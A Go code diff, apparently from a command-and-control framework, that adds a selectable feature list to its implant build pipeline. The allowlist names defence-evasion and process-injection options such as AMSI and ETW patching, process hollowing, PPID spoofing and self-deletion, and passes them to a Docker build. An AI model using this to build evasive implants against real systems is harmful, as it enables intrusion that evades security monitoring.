@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
@@ -36,10 +37,11 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 			ProfileName  string `json:"profile_name"`
 			TargetOS     string `json:"target_os"`
 			TargetArch   string `json:"target_arch"`
-			SleepSeconds int    `json:"sleep_seconds"`
-			JitterPct    int    `json:"jitter_pct"`
-			Ephemeral    bool   `json:"ephemeral"`
-			SleepEncrypt bool   `json:"sleep_encrypt"`
+			SleepSeconds int      `json:"sleep_seconds"`
+			JitterPct    int      `json:"jitter_pct"`
+			Ephemeral    bool     `json:"ephemeral"`
+			SleepEncrypt bool     `json:"sleep_encrypt"`
+			Features     []string `json:"features"`
 		} `json:"config"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
@@ -106,7 +108,7 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 
 	// Kick off the build in the background
 	go g.runBuild(b.ID, buildUUID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
-		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.SleepEncrypt)
+		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.SleepEncrypt, cfg.Features)
 
 	writeJSON(w, http.StatusCreated, b)
 }
@@ -168,7 +170,7 @@ func (g *gateway) handleListBuilds(w http.ResponseWriter, r *http.Request) {
 
 // runBuild executes the Docker build in a background goroutine and updates the build record.
 func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
-	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, sleepEncrypt bool) {
+	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, sleepEncrypt bool, features []string) {
 
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
 	defer cancel()
@@ -208,6 +210,27 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
 		sleepEncryptStr = "true"
 	}
 
+	featuresArg := ""
+	if len(features) > 0 {
+		allowed := map[string]bool{
+			"inject-classic": true, "inject-apc": true, "inject-hollow": true,
+			"inject-hijack": true, "inject-stomp": true, "unhook": true,
+			"etw-patch": true, "amsi-patch": true, "ppid-spoof": true,
+			"heap-encrypt": true, "stack-spoof": true, "udrl": true, "staged-payload": true,
+			"self-delete": true, "channel-tcp": true, "channel-smb": true,
+			"sleep-encrypt": true,
+		}
+		var validated []string
+		for _, f := range features {
+			if allowed[f] {
+				validated = append(validated, f)
+			}
+		}
+		if len(validated) > 0 {
+			featuresArg = strings.Join(validated, ",")
+		}
+	}
+
 	buildArgs := []string{
 		"build",
 		"-f", "/workspace/deploy/docker/Dockerfile.agent",
@@ -224,6 +247,7 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
 		"--build-arg", "DM_NO_EVASION=false",
 		"--build-arg", "DM_UA=" + userAgent,
 		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncryptStr,
+		"--build-arg", "DM_FEATURES=" + featuresArg,
 	}
 	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
 		buildArgs = append(buildArgs, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
